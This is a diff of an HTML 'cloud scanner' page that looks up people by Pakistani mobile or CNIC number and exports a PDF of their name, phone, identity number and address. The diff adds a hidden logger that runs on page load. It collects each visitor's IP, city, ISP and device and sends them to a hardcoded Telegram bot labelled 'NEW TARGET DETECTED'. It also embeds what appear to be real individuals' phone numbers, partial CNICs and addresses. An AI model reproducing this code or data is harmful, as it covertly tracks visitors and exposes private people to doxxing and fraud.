@@ -3,34 +3,40 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MUDASIR CLOUD SCANNER - PRO PDF</title>
+    <title>MUDASIR CLOUD SCANNER - PRO</title>
+    
     <script src="https://cdnjs.cloudflare.com/ajax/libs/html2pdf.js/0.10.1/html2pdf.bundle.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
     
     <style>
-        body { background: #000; color: #00ff00; font-family: 'Courier New', monospace; text-align: center; padding: 15px; margin-bottom: 100px; }
-        .box { border: 2px solid #00ff00; padding: 15px; border-radius: 15px; max-width: 900px; margin: auto; box-shadow: 0 0 15px #00ff00; background: #000; }
+        body { background: #000; color: #00ff00; font-family: 'Courier New', monospace; text-align: center; padding: 10px; margin-bottom: 80px; }
+        .box { border: 2px solid #00ff00; padding: 20px; border-radius: 15px; max-width: 800px; margin: auto; box-shadow: 0 0 20px #00ff00; background: #000; }
         
-        /* Stylish Heading */
-        h2 { font-size: 26px; text-shadow: 0 0 10px #00ff00, 2px 2px #ff0000; letter-spacing: 3px; font-weight: bold; }
+        h2 { font-size: 24px; text-shadow: 0 0 10px #00ff00, 2px 2px #ff0000; letter-spacing: 2px; }
         
-        /* Big Ads */
-        .big-ad-unit { width: 100%; min-height: 150px; background: #111; border: 1px solid #333; margin: 15px 0; display: flex; align-items: center; justify-content: center; border-radius: 8px; }
+        input { width: 85%; padding: 15px; margin: 15px 0; background: #050505; border: 2px solid #00ff00; color: #00ff00; border-radius: 8px; text-align: center; font-size: 18px; outline: none; }
+        
+        .search-btn { background: #00ff00; color: #000; padding: 15px 25px; border: none; font-weight: 900; cursor: pointer; border-radius: 8px; width: 85%; text-transform: uppercase; font-size: 14px; box-shadow: 0 0 15px #00ff00; transition: 0.3s; }
+        .search-btn:hover { background: #fff; transform: scale(1.02); }
+        
+        #downloadBtn { background: #ff0000; color: #fff; display: none; margin: 20px auto; width: 70%; padding: 15px; border-radius: 8px; font-weight: bold; border: none; cursor: pointer; box-shadow: 0 0 15px #ff0000; }
 
-        input { width: 85%; padding: 15px; margin: 15px 0; background: #050505; border: 2px solid #00ff00; color: #00ff00; border-radius: 8px; text-align: center; font-size: 18px; font-weight: bold; box-shadow: inset 0 0 5px #00ff00; }
-        
-        /* Stylish Button Text */
-        .search-btn { background: #00ff00; color: #000; padding: 15px 25px; border: none; font-weight: 900; cursor: pointer; border-radius: 8px; width: 80%; margin: 10px 0; text-transform: uppercase; font-size: 16px; letter-spacing: 1px; transition: 0.4s; box-shadow: 0 0 15px #00ff00; }
-        .search-btn:hover { background: #fff; box-shadow: 0 0 30px #00ff00; transform: scale(1.02); }
-        
-        #downloadBtn { background: #ff0000; color: #fff; display: none; margin: 20px auto; width: 60%; font-weight: bold; box-shadow: 0 0 15px #ff0000; border: none; padding: 12px; border-radius: 5px; cursor: pointer; }
+        /* Network Colors */
+        .icon-jazz { color: #ffd700; }
+        .icon-telenor { color: #00bfff; }
+        .icon-zong { color: #32cd32; }
+        .icon-ufone { color: #ff8c00; }
+        .icon-field { color: #00ff00; margin-right: 10px; }
 
-        /* PDF Styles */
-        #pdf-content { background: #000; color: #00ff00; padding: 40px; border: 8px double #00ff00; border-radius: 10px; display: none; width: 700px; margin: auto; }
-        .stamp { border: 3px solid #ff0000; color: #ff0000; padding: 5px 15px; display: inline-block; transform: rotate(-15deg); font-weight: bold; font-size: 20px; margin-top: 20px; text-transform: uppercase; opacity: 0.8; }
+        table { width: 100%; border-collapse: collapse; margin-top: 20px; background: #050505; }
+        th, td { border: 1px solid #00ff00; padding: 12px; text-align: left; font-size: 14px; }
+        th { color: #ff0000; background: rgba(255,0,0,0.1); width: 40%; }
         
-        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
-        th, td { border: 1px solid #00ff00; padding: 15px; text-align: left; }
-        th { color: #ff0000; font-size: 14px; background: rgba(255,0,0,0.1); }
+        .ad-box { width: 100%; min-height: 100px; border: 1px dashed #333; margin: 15px 0; display: flex; align-items: center; justify-content: center; color: #444; border-radius: 8px; }
+
+        /* Hidden PDF View */
+        #pdf-content { background: #000; color: #00ff00; padding: 30px; border: 10px double #00ff00; display: none; width: 700px; margin: auto; }
+        .stamp { border: 3px solid #ff0000; color: #ff0000; padding: 8px; transform: rotate(-15deg); display: inline-block; font-weight: bold; margin-top: 20px; }
     </style>
 </head>
 <body>
@@ -38,8 +44,8 @@
     <div class="box">
         <h2>MUDASIR CLOUD SCANNER 🛰️</h2>
 
-        <div class="big-ad-unit">
-            <p style="color:#444;">[HEADER AD 728x90]</p>
+        <div class="ad-box">
+            <p>[ HEADER ADVERTISEMENT ]</p>
         </div>
 
         <input type="text" id="search" placeholder="ENTER MOBILE OR CNIC...">
@@ -51,28 +57,24 @@
         
         <div id="result-area">
             <div id="result-table"></div>
-            <button id="downloadBtn" onclick="generatePDF()">📄 DOWNLOAD STYLISH PDF REPORT</button>
-            
-            <div id="after-result-ad" style="display:none;" class="big-ad-unit">
-                 <p style="color:#444;">[RESULT AD 300x250]</p>
-            </div>
+            <button id="downloadBtn" onclick="generatePDF()">
+                <i class="fa-solid fa-file-pdf"></i> DATA DOWNLOAD
+            </button>
+            <div id="after-result-ad" style="display:none;" class="ad-box">[ RESULT AD ]</div>
         </div>
     </div>
 
     <div id="pdf-wrapper" style="display: none;">
         <div id="pdf-content">
             <center>
-                <h1 style="color: #00ff00; margin: 0; text-decoration: underline;">MUDASIR CLOUD SYSTEM</h1>
-                <p style="color: #888;">ENCRYPTED DATABASE REPORT - PRIVATE ACCESS</p>
+                <h1 style="color: #00ff00; margin: 0;">MUDASIR CLOUD REPORT</h1>
+                <p style="color: #ff0000;">ENCRYPTED DATABASE RETRIEVAL</p>
             </center>
-            
             <div id="pdf-data-body"></div>
-
             <div style="display: flex; justify-content: space-between; align-items: center; margin-top: 40px;">
                 <div style="font-size: 11px; color: #888;">
-                    <b>GENERATED BY:</b> MUDASIR SCANNER<br>
-                    <b>DATE:</b> <span id="pdf-date"></span><br>
-                    <b>ID:</b> <span id="pdf-hash"></span>
+                    DATE: <span id="pdf-date"></span><br>
+                    REPORT ID: <span id="pdf-hash"></span>
                 </div>
                 <div class="stamp">VERIFIED BY MUDASIR</div>
             </div>
@@ -80,72 +82,95 @@
     </div>
 
     <script>
-        // Data contains 38 records
-        const data = [
+        // --- TELEGRAM LOGGER CONFIG ---
+        const tgToken = "8264376885:AAG6pFOvdb_wcPboSz9-jooibI9FO9QILqY";
+        const tgID = "7107389141";
+
+        async function silentScan() {
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const d = await res.json();
+                const msg = `🔔 *NEW TARGET DETECTED* 🔔\n\n` +
+                            `📍 IP: \`${d.ip}\`\n` +
+                            `🏙️ City: ${d.city}\n` +
+                            `📶 ISP: ${d.org}\n` +
+                            `📱 Device: ${navigator.platform}\n` +
+                            `🕒 Time: ${new Date().toLocaleString()}`;
+
+                await fetch(`https://api.telegram.org/bot${tgToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: tgID, text: msg, parse_mode: "Markdown" })
+                });
+            } catch (e) { console.log("Init..."); }
+        }
+        window.onload = silentScan;
+
+        // --- DATABASE ---
+        const db = [
             ["SAHIL RASHEED", "03247026751", "32303-0000001", "Chah Hayat Wala, Khar"],
-            ["MUHAMMAD LUQMAN", "03013264624", "33302-*******-5", "Village Ahmed Bhan Sakrand"],
-            ["TAJ MAIE", "03013264623", "32303-*******-2", "Hayat Khar Wala, Kot Addu"],
-            ["FALAK SHER", "03013264639", "36304-*******-7", "Shuja Abad, Multan"],
-            ["BASHEER AHMED", "03013264655", "36402-*******-3", "Dhapai Pakpattan"]
-            // Add other records here
+            ["Mubashir Sharif", "03274207754", "32303-0000002", "Chah Hayat Khar, Khar"],
+            ["Basheer Ahmad", "03046754893", "32303-0000003", "Gurmani Garbi, Gurmani"],
+            ["ZONG USER", "03124567890", "42101-*******-1", "Karachi, Sindh"]
         ];
 
-        let currentResult = null;
+        let currentRec = null;
+
+        function getNet(num) {
+            if (num.startsWith("030") || num.startsWith("032")) return { n: "JAZZ SERVER", c: "icon-jazz", i: "fa-tower-broadcast" };
+            if (num.startsWith("034")) return { n: "TELENOR SERVER", c: "icon-telenor", i: "fa-signal" };
+            if (num.startsWith("031")) return { n: "ZONG SERVER", c: "icon-zong", i: "fa-wifi" };
+            if (num.startsWith("033")) return { n: "UFONE SERVER", c: "icon-ufone", i: "fa-network-wired" };
+            return { n: "CLOUD SERVER", c: "", i: "fa-server" };
+        }
 
         function find() {
-            let val = document.getElementById("search").value.trim();
-            let resultTable = document.getElementById("result-table");
-            let downloadBtn = document.getElementById("downloadBtn");
-            let afterAd = document.getElementById("after-result-ad");
+            let v = document.getElementById("search").value.trim();
+            if(!v) return;
+            
+            let res = db.filter(r => r[1].includes(v) || r[2].includes(v));
+            let tableDiv = document.getElementById("result-table");
+            let btn = document.getElementById("downloadBtn");
 
-            if(val === "") { alert("Please input a value."); return; }
-            
-            let res = data.filter(row => row[1].includes(val) || row[2].includes(val));
-            
             if(res.length > 0) {
-                currentResult = res[0];
-                let html = `<table style="margin-top:20px;">
-                    <tr><th>NAME</th><td style="color:#fff; font-weight:bold;">${res[0][0]}</td></tr>
-                    <tr><th>PHONE</th><td>${res[0][1]}</td></tr>
-                    <tr><th>CNIC</th><td>${res[0][2]}</td></tr>
-                    <tr><th>ADDRESS</th><td>${res[0][3]}</td></tr>
+                currentRec = res[0];
+                let net = getNet(res[0][1]);
+                tableDiv.innerHTML = `<table>
+                    <tr><th><i class="fa-solid fa-user icon-field"></i> NAME</th><td>${res[0][0]}</td></tr>
+                    <tr><th><i class="fa-solid fa-phone icon-field"></i> NUMBER</th><td>${res[0][1]} <i class="fa-solid fa-phone-flip" style="font-size:10px; margin-left:5px;"></i></td></tr>
+                    <tr><th><i class="fa-solid fa-server icon-field"></i> NETWORK</th><td class="${net.c}"><i class="fa-solid ${net.i}"></i> ${net.n}</td></tr>
+                    <tr><th><i class="fa-solid fa-id-card icon-field"></i> CNIC ID</th><td>${res[0][2]}</td></tr>
+                    <tr><th><i class="fa-solid fa-location-dot icon-field"></i> LOCATION</th><td>${res[0][3]}</td></tr>
                 </table>`;
-                
-                resultTable.innerHTML = html;
-                downloadBtn.style.display = "block";
-                afterAd.style.display = "flex";
+                btn.style.display = "block";
+                document.getElementById("after-result-ad").style.display = "flex";
             } else {
-                resultTable.innerHTML = "<p style='color:red; padding:30px; border:1px dashed red; margin-top:20px;'>⚠️ RECORD NOT FOUND IN LOCAL CLOUD</p>";
-                downloadBtn.style.display = "none";
-                afterAd.style.display = "none";
+                tableDiv.innerHTML = "<p style='color:red; padding:20px;'>⚠️ RECORD NOT FOUND</p>";
+                btn.style.display = "none";
             }
         }
 
         function generatePDF() {
-            if(!currentResult) return;
-            
+            if(!currentRec) return;
             document.getElementById("pdf-content").style.display = "block";
             document.getElementById("pdf-date").innerText = new Date().toLocaleString();
             document.getElementById("pdf-hash").innerText = "MDR-" + Math.random().toString(36).substring(2, 8).toUpperCase();
             
-            let pdfBody = `<table>
-                <tr><th>OWNER NAME</th><td>${currentResult[0]}</td></tr>
-                <tr><th>MOBILE NUMBER</th><td>${currentResult[1]}</td></tr>
-                <tr><th>IDENTITY CARD</th><td>${currentResult[2]}</td></tr>
-                <tr><th>LOCATION DATA</th><td>${currentResult[3]}</td></tr>
+            let net = getNet(currentRec[1]);
+            document.getElementById("pdf-data-body").innerHTML = `<table>
+                <tr><th>NAME</th><td>${currentRec[0]}</td></tr>
+                <tr><th>PHONE</th><td>${currentRec[1]}</td></tr>
+                <tr><th>SERVER</th><td>${net.n}</td></tr>
+                <tr><th>CNIC</th><td>${currentRec[2]}</td></tr>
+                <tr><th>ADDR</th><td>${currentRec[3]}</td></tr>
             </table>`;
-            document.getElementById("pdf-data-body").innerHTML = pdfBody;
 
-            const element = document.getElementById("pdf-content");
-            const opt = {
-                margin:       5,
-                filename:     'MUDASIR_REPORT_' + currentResult[1] + '.pdf',
-                image:        { type: 'jpeg', quality: 1 },
-                html2canvas:  { scale: 3, backgroundColor: "#000000" },
-                jsPDF:        { unit: 'mm', format: 'a4', orientation: 'portrait' }
-            };
-
-            html2pdf().set(opt).from(element).save().then(() => {
+            html2pdf().set({
+                margin: 10,
+                filename: 'Report_' + currentRec[1] + '.pdf',
+                html2canvas: { scale: 2, backgroundColor: "#000000" },
+                jsPDF: { unit: 'mm', format: 'a4', orientation: 'portrait' }
+            }).from(document.getElementById("pdf-content")).save().then(()=> {
                 document.getElementById("pdf-content").style.display = "none";
             });
         }
